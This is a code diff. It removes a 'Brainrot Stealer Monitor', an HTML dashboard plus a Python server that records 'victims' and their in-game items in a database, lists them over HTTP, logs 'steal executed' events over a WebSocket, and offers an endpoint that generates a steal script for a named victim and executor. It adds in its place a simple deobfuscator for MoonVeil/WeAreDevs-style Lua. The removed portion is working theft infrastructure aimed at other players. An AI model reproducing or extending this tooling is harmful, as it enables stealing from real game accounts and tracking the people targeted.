@@ -2,389 +2,88 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brainrot Stealer Monitor</title>
+    <title>MoonVeil / WeAreDevs Deobfuscator</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a0a;
-            font-family: 'Courier New', monospace;
-            padding: 20px;
-            min-height: 100vh;
-        }
-        .container { max-width: 1400px; margin: 0 auto; }
-        .header {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            border: 1px solid #00ff41;
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 0 20px rgba(0,255,65,0.1);
-        }
-        .header h1 { color: #00ff41; font-size: 24px; text-shadow: 0 0 5px #00ff41; }
-        .header p { color: #888; font-size: 12px; margin-top: 5px; }
-        .status-bar { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
-        .status-card {
-            background: #0f0f1a;
-            border: 1px solid #2a2a3a;
-            border-radius: 6px;
-            padding: 15px;
-            flex: 1;
-            min-width: 200px;
-        }
-        .status-label { color: #888; font-size: 11px; text-transform: uppercase; }
-        .status-value { color: #00ff41; font-size: 18px; font-weight: bold; margin-top: 5px; word-break: break-all; }
-        .status-value.disconnected { color: #ff3333; }
-        .control-panel {
-            background: #0f0f1a;
-            border: 1px solid #2a2a3a;
-            border-radius: 6px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        .input-group { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px; }
-        .input-group input {
-            flex: 2;
-            min-width: 200px;
-            background: #1a1a2a;
-            border: 1px solid #2a2a3a;
-            color: #00ff41;
-            padding: 10px 15px;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            border-radius: 4px;
-        }
-        .input-group input:focus { outline: none; border-color: #00ff41; }
-        button {
-            background: #1a1a2a;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            padding: 10px 20px;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 4px;
-            transition: all 0.2s;
-        }
-        button:hover { background: #00ff41; color: #0a0a0a; }
-        .log-container {
-            background: #0f0f1a;
-            border: 1px solid #2a2a3a;
-            border-radius: 6px;
-            padding: 15px;
-            height: 500px;
-            overflow-y: auto;
-        }
-        .log-entry {
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            padding: 6px 10px;
-            border-bottom: 1px solid #1a1a2a;
-            color: #ccc;
-        }
-        .log-entry.notification {
-            background: #1a3a1a;
-            color: #00ff41;
-            border-left: 3px solid #00ff41;
-            font-weight: bold;
-        }
-        .log-entry.claim {
-            background: #2a1a1a;
-            color: #ff6666;
-            border-left: 3px solid #ff3333;
-        }
-        .timestamp { color: #666; margin-right: 10px; }
-        .clear-btn { float: right; margin-bottom: 10px; }
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        .stat-card {
-            background: #0f0f1a;
-            border: 1px solid #2a2a3a;
-            border-radius: 6px;
-            padding: 10px;
-            text-align: center;
-        }
-        .stat-number { font-size: 28px; font-weight: bold; color: #00ff41; }
-        .stat-label { font-size: 10px; color: #888; text-transform: uppercase; }
+        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
+        textarea { width: 100%; height: 200px; background: #111; color: #0f0; border: 1px solid #0ff; font-family: monospace; }
+        button { background: #0ff; color: #000; border: none; padding: 10px; cursor: pointer; margin: 5px; }
+        pre { background: #111; padding: 10px; border: 1px solid #0ff; overflow-x: auto; white-space: pre-wrap; }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="header">
-        <h1>⚡ BRAINROT STEALER MONITOR ⚡</h1>
-        <p>Real-time WebSocket surveillance system | Made By @skiingback</p>
-    </div>
-
-    <div class="status-bar">
-        <div class="status-card">
-            <div class="status-label">WebSocket Status</div>
-            <div class="status-value" id="wsStatus">● DISCONNECTED</div>
-        </div>
-        <div class="status-card">
-            <div class="status-label">Tracking User ID</div>
-            <div class="status-value" id="trackingDisplay">None</div>
-        </div>
-        <div class="status-card">
-            <div class="status-label">Claims Detected</div>
-            <div class="status-value" id="claimCount">0</div>
-        </div>
-    </div>
-
-    <div class="stats">
-        <div class="stat-card"><div class="stat-number" id="statClaims">0</div><div class="stat-label">Total Claims</div></div>
-        <div class="stat-card"><div class="stat-number" id="statVictims">0</div><div class="stat-label">Victims</div></div>
-        <div class="stat-card"><div class="stat-number" id="statBrainrots">0</div><div class="stat-label">Brainrots</div></div>
-    </div>
-
-    <div class="control-panel">
-        <div class="input-group">
-            <input type="text" id="targetUserId" placeholder="Enter victim username to track (e.g., SAVVAKOSS1)">
-            <button id="trackBtn">🔍 TRACK USER</button>
-            <button id="clearLogBtn">🗑️ CLEAR LOG</button>
-        </div>
-        <div class="input-group">
-            <input type="text" id="wsUrl" placeholder="WebSocket URL (default: ws://localhost:8765)" value="ws://localhost:8765">
-            <button id="connectBtn">🔌 CONNECT</button>
-            <button id="disconnectBtn">⛔ DISCONNECT</button>
-        </div>
-    </div>
-
-    <div class="log-container">
-        <div style="margin-bottom: 10px;">
-            <span style="color:#00ff41;">▼ LIVE FEED</span>
-        </div>
-        <div id="log"></div>
-    </div>
-</div>
+<h2>MoonVeil / WeAreDevs Deobfuscator</h2>
+<textarea id="input" placeholder="Paste obfuscated Lua or JS (MoonVeil style) here..."></textarea><br>
+<button onclick="deobfuscate()">Deobfuscate</button>
+<button onclick="clearAll()">Clear</button>
+<h3>Result:</h3>
+<pre id="output"></pre>
 
 <script>
-    let ws = null;
-    let targetUserId = "";
-    let claimCount = 0;
-    let victims = new Set();
-    let brainrotNames = new Set();
+    function deobfuscate() {
+        let code = document.getElementById('input').value;
+        let result = "";
 
-    const logDiv = document.getElementById('log');
-    const wsStatusSpan = document.getElementById('wsStatus');
-    const trackingDisplay = document.getElementById('trackingDisplay');
-    const claimCountSpan = document.getElementById('claimCount');
-    const statClaims = document.getElementById('statClaims');
-    const statVictims = document.getElementById('statVictims');
-    const statBrainrots = document.getElementById('statBrainrots');
-
-    function updateStats() {
-        statClaims.textContent = claimCount;
-        statVictims.textContent = victims.size;
-        statBrainrots.textContent = brainrotNames.size;
-        claimCountSpan.textContent = claimCount;
-    }
-
-    function addLog(message, type = 'info') {
-        const entry = document.createElement('div');
-        entry.className = 'log-entry';
-        if (type === 'notification') entry.classList.add('notification');
-        if (type === 'claim') entry.classList.add('claim');
-        const timestamp = new Date().toISOString().slice(11, 19);
-        entry.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
-        logDiv.appendChild(entry);
-        entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-    }
-
-    function updateStatus(connected) {
-        if (connected) {
-            wsStatusSpan.innerHTML = '● CONNECTED';
-            wsStatusSpan.classList.remove('disconnected');
-        } else {
-            wsStatusSpan.innerHTML = '● DISCONNECTED';
-            wsStatusSpan.classList.add('disconnected');
-        }
-    }
-
-    function connectWebSocket() {
-        const url = document.getElementById('wsUrl').value.trim();
-        if (!url) {
-            addLog("ERROR: No WebSocket URL provided", 'notification');
-            return;
-        }
-        
-        if (ws && ws.readyState === WebSocket.OPEN) {
-            ws.close();
-        }
-        
-        ws = new WebSocket(url);
-        
-        ws.onopen = () => {
-            updateStatus(true);
-            addLog(`WebSocket connected to ${url}`, 'notification');
-        };
-        
-        ws.onmessage = (event) => {
+        // Stage 1: Remove base64 wrappers common in MoonVeil
+        let b64match = code.match(/loadstring\(decode\("([^"]+)"\)\)/);
+        if (!b64match) b64match = code.match(/loadstring\(dec\("([^"]+)"\)\)/);
+        if (!b64match) b64match = code.match(/loadstring\(\_G\[.*?\]\("([^"]+)"\)\)/);
+        if (b64match) {
             try {
-                const data = JSON.parse(event.data);
-                if (data.event === 'claim') {
-                    const userId = data.userId || 'unknown';
-                    const brainrotId = data.brainrotId || 'unknown';
-                    const brainrotValue = data.brainrotValue || '';
-                    
-                    victims.add(userId);
-                    brainrotNames.add(brainrotId);
-                    
-                    if (!targetUserId || userId.toLowerCase() === targetUserId.toLowerCase()) {
-                        claimCount++;
-                        updateStats();
-                        addLog(`🎯 CLAIM DETECTED: User "${userId}" claimed brainrot "${brainrotId}" ${brainrotValue}`, 'claim');
-                        
-                        // Browser notification
-                        if (Notification.permission === 'granted') {
-                            new Notification('Brainrot Claim Detected', {
-                                body: `${userId} claimed ${brainrotId}`,
-                                icon: 'https://i.imgur.com/6K5qFkY.png'
-                            });
-                        }
-                    } else {
-                        addLog(`📡 Claim from ${userId} (not tracked) - ${brainrotId}`, 'info');
-                    }
-                } else if (data.event === 'steal_executed') {
-                    addLog(`💀 STEAL EXECUTED: ${data.victim} was robbed by ${data.executor}`, 'notification');
-                } else {
-                    addLog(`📨 ${JSON.stringify(data)}`, 'info');
-                }
-            } catch(e) {
-                addLog(`RAW: ${event.data}`, 'info');
-            }
-        };
-        
-        ws.onerror = (error) => {
-            addLog(`WebSocket error: ${error.type}`, 'notification');
-        };
-        
-        ws.onclose = () => {
-            updateStatus(false);
-            addLog("WebSocket disconnected", 'notification');
-            ws = null;
-        };
+                let decoded = atob(b64match[1]);
+                code = decoded;
+            } catch(e) { /* keep original */ }
+        }
+
+        // Stage 2: Remove loadstring wrappers
+        code = code.replace(/loadstring\(([^)]+)\)\(\)/g, '$1');
+        code = code.replace(/load\(([^)]+)\)\(\)/g, '$1');
+
+        // Stage 3: Handle WeAreDevs style __O__ array lookups
+        let obfArrayMatch = code.match(/local\s+__O__\s*=\s*\{([^}]+)\}/);
+        if (obfArrayMatch) {
+            let arrayContent = obfArrayMatch[1];
+            let elements = arrayContent.split(',').map(s => s.trim().replace(/^["']|["']$/g, ''));
+            code = code.replace(/__O__\[(\d+)\]/g, (match, idx) => {
+                let i = parseInt(idx);
+                return elements[i] || match;
+            });
+        }
+
+        // Stage 4: Remove string.char obfuscation
+        code = code.replace(/string\.char\(([^)]+)\)/g, (match, group) => {
+            let nums = group.split(',').map(n => parseInt(n.trim()));
+            let chars = nums.map(n => String.fromCharCode(n)).join('');
+            return JSON.stringify(chars);
+        });
+
+        // Stage 5: Remove (function() ... end)() wrapper if present
+        code = code.replace(/^\(\s*function\s*\(\)\s*([\s\S]*?)\s*end\s*\)\s*\(\s*\)/i, '$1');
+
+        // Stage 6: Replace escaped characters
+        code = code.replace(/\\x([0-9A-Fa-f]{2})/g, (match, hex) => String.fromCharCode(parseInt(hex, 16)));
+        code = code.replace(/\\(\d{3})/g, (match, oct) => String.fromCharCode(parseInt(oct, 8)));
+
+        // Stage 7: Pretty print attempt (basic)
+        code = code.replace(/;{2,}/g, ';\n');
+        code = code.replace(/\)\{/g, ')\n{');
+        code = code.replace(/\}\s*else/g, '} else');
+
+        // Stage 8: Remove redundant __O__ leftovers
+        code = code.replace(/__O__\[[^\]]+\]/g, '?');
+
+        if (code === document.getElementById('input').value || code.length < 10) {
+            result = "// Could not fully deobfuscate. Here is raw cleaned version:\n" + code;
+        } else {
+            result = "// Deobfuscated result:\n" + code;
+        }
+
+        document.getElementById('output').innerText = result;
     }
-    
-    function disconnectWebSocket() {
-        if (ws) {
-            ws.close();
-            ws = null;
-        }
-        updateStatus(false);
-        addLog("Manually disconnected", 'notification');
+
+    function clearAll() {
+        document.getElementById('input').value = "";
+        document.getElementById('output').innerText = "";
     }
-    
-    document.getElementById('connectBtn').addEventListener('click', connectWebSocket);
-    document.getElementById('disconnectBtn').addEventListener('click', disconnectWebSocket);
-    document.getElementById('clearLogBtn').addEventListener('click', () => {
-        logDiv.innerHTML = '';
-        addLog("Log cleared", 'notification');
-    });
-    document.getElementById('trackBtn').addEventListener('click', () => {
-        const newId = document.getElementById('targetUserId').value.trim();
-        if (newId === "") {
-            addLog("ERROR: Enter a username to track", 'notification');
-            return;
-        }
-        targetUserId = newId;
-        trackingDisplay.innerHTML = targetUserId;
-        addLog(`Now tracking claims for: ${targetUserId}`, 'notification');
-        if (Notification.permission === 'default') {
-            Notification.requestPermission();
-        }
-    });
-    
-    // Auto-connect on page load
-    setTimeout(() => { connectWebSocket(); }, 500);
-    addLog("Monitor ready. Enter a username and click 'TRACK USER'", 'notification');
 </script>
 </body>
-</html>'''
-    return web.Response(text=html, content_type='text/html')
-
-async def generate_script_handler(request):
-    """HTTP endpoint to generate the steal script"""
-    data = await request.json()
-    victim = data.get('victim_username')
-    trade_target = data.get('trade_target')
-    brainrots = data.get('brainrots', [])
-    ws_endpoint = data.get('ws_endpoint', 'ws://localhost:8765')
-    
-    if not victim or not trade_target:
-        return web.json_response({'error': 'Missing victim_username or trade_target'}, status=400)
-    
-    conn = sqlite3.connect('brainrot_stealer.db')
-    c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO victims (victim_username, trade_target, executor, timestamp) VALUES (?, ?, ?, ?)",
-              (victim, trade_target, data.get('executor', 'Delta'), time.time()))
-    for br in brainrots:
-        c.execute("INSERT INTO brainrots (victim_username, brainrot_name, value, claimed) VALUES (?, ?, ?, 0)",
-                  (victim, br.get('name'), br.get('value', 'Unknown')))
-    conn.commit()
-    conn.close()
-    
-    script = generate_steal_script(victim, trade_target, brainrots, ws_endpoint)
-    return web.json_response({'script': script, 'websocket_endpoint': ws_endpoint})
-
-async def status_handler(request):
-    """Get all claimed/unclaimed brainrots"""
-    conn = sqlite3.connect('brainrot_stealer.db')
-    c = conn.cursor()
-    c.execute("SELECT victim_username, brainrot_name, value, claimed, claimed_by FROM brainrots ORDER BY claim_timestamp DESC")
-    rows = c.fetchall()
-    conn.close()
-    results = []
-    for row in rows:
-        results.append({
-            'victim': row[0],
-            'brainrot': row[1],
-            'value': row[2],
-            'claimed': bool(row[3]),
-            'claimed_by': row[4]
-        })
-    return web.json_response(results)
-
-async def victims_handler(request):
-    """List all victims"""
-    conn = sqlite3.connect('brainrot_stealer.db')
-    c = conn.cursor()
-    c.execute("SELECT victim_username, trade_target, timestamp FROM victims ORDER BY timestamp DESC")
-    rows = c.fetchall()
-    conn.close()
-    return web.json_response([{'username': r[0], 'target': r[1], 'timestamp': r[2]} for r in rows])
-
-# ========== MAIN ==========
-async def main():
-    # WebSocket server
-    ws_server = await websockets.serve(websocket_handler, "0.0.0.0", 8765)
-    print("[SERVER] WebSocket endpoint: ws://0.0.0.0:8765")
-    
-    # HTTP server
-    app = web.Application()
-    app.router.add_get('/', index_handler)
-    app.router.add_post('/generate_script', generate_script_handler)
-    app.router.add_get('/status', status_handler)
-    app.router.add_get('/victims', victims_handler)
-    
-    runner = web.AppRunner(app)
-    await runner.setup()
-    http_site = web.TCPSite(runner, "0.0.0.0", 8888)
-    await http_site.start()
-    
-    print("[SERVER] HTTP Monitor: http://localhost:8888")
-    print("[SERVER] API Endpoints:")
-    print("  - POST /generate_script  (generate steal script)")
-    print("  - GET  /status           (view all brainrots)")
-    print("  - GET  /victims          (view victims)")
-    print("\n" + "="*50)
-    print("READY: Open http://localhost:8888 in your browser")
-    print("="*50)
-    
-    await asyncio.Future()
-
-if __name__ == "__main__":
-    asyncio.run(main())
+</html>
